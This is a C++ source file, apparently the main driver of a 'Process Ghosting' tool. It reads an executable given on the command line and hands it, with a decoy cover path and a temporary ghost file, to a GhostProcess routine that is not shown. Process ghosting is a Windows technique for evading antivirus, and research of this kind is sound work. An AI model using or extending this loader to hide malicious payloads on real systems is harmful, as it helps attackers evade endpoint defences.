#include <Windows.h>
#include <stdio.h>

#include "nt_init_func.hpp"
#include "GhostProcess.hpp"


payload_data GetPayloadContent(CHAR* payloadFile) {
	HANDLE hFile = ::CreateFileA(payloadFile, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	DWORD size = ::GetFileSize(hFile, 0);
	LPVOID buf = ::VirtualAlloc(0, size, MEM_COMMIT, PAGE_READWRITE);
	if (!::ReadFile(hFile, buf, size, 0, 0)) {
		printf("Unable to read file : %d\n", ::GetLastError());
		exit(0);
	}
	::CloseHandle(hFile);

	payload_data payload;
	payload.size = size;
	payload.buf = (BYTE*)buf;
	return payload;
}

int main(int argc, char* argv[]) {
	if (argc < 2) {
		printf("\"Process Ghosting.exe\" <Program to run>\n");
		return 1;
	}

	WCHAR coverFile[] = L"C:\\i_dont_exist.txt";
	CHAR ghostFile[] = "C:\\Users\\Hrudaya_Vikasa\\Desktop\\tmp.txt";
	//CHAR payloadFile[] = "C:\\Users\\Lab\\Desktop\\calc.exe";
	CHAR* payloadFile = argv[1];

	payload_data payload = GetPayloadContent(payloadFile);

	nt_init();
	GhostProcess(ghostFile, coverFile, payload);

	::VirtualFree(payload.buf, 0, MEM_RELEASE);

	return 0;
}